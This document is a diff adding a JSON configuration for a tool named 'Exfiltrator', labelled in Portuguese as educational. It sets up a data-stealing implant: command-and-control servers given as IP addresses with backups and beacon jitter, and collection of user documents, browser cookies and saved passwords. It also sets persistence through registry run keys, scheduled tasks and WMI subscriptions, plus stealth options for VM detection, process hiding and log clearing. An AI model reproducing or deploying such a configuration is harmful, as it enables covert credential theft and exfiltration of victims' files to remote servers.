@@ -1,0 +1,79 @@
+```json
+{
+  "general": {
+    "project_name": "Exfiltrator",
+    "version": "2.3.7",
+    "author": "Shadow Protocol Research Team",
+    "description": "Ferramenta educacional para demonstração de técnicas de exfiltração"
+  },
+  "c2": {
+    "primary_server": "185.142.97.52",
+    "primary_port": 8080,
+    "backup_servers": [
+      "193.27.14.22:443",
+      "91.233.107.8:8443"
+    ],
+    "communication_protocol": "https",
+    "check_interval_seconds": 300,
+    "max_connection_attempts": 5,
+    "jitter_percent": 15,
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  },
+  "exfiltration": {
+    "targets": {
+      "documents": {
+        "enabled": true,
+        "file_extensions": [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt"],
+        "search_paths": [
+          "%USERPROFILE%\\Documents",
+          "%USERPROFILE%\\Desktop",
+          "%USERPROFILE%\\Downloads"
+        ],
+        "max_file_size_mb": 10,
+        "max_files_per_session": 50
+      },
+      "browser_data": {
+        "enabled": true,
+        "browsers": ["chrome", "firefox", "edge"],
+        "data_types": ["history", "bookmarks", "cookies", "saved_passwords"]
+      },
+      "system_info": {
+        "enabled": true,
+        "collect_hardware_info": true,
+        "collect_installed_software": true,
+        "collect_network_config": true
+      }
+    },
+    "data_handling": {
+      "compression": true,
+      "encryption": {
+        "algorithm": "AES-256-CBC",
+        "key_derivation": "PBKDF2",
+        "iterations": 10000
+      },
+      "chunk_size_kb": 500,
+      "max_data_per_session_mb": 50
+    }
+  },
+  "persistence": {
+    "methods": {
+      "registry_run": true,
+      "scheduled_task": true,
+      "startup_folder": false,
+      "wmi_subscription": true
+    },
+    "trigger_events": [
+      "system_boot",
+      "user_login",
+      "network_connect"
+    ]
+  },
+  "stealth": {
+    "detect_analysis_tools": true,
+    "detect_virtual_environment": true,
+    "self_delete_if_detected": false,
+    "hide_process": true,
+    "clear_logs": true,
+    "randomize_filenames": true
+  }
+}
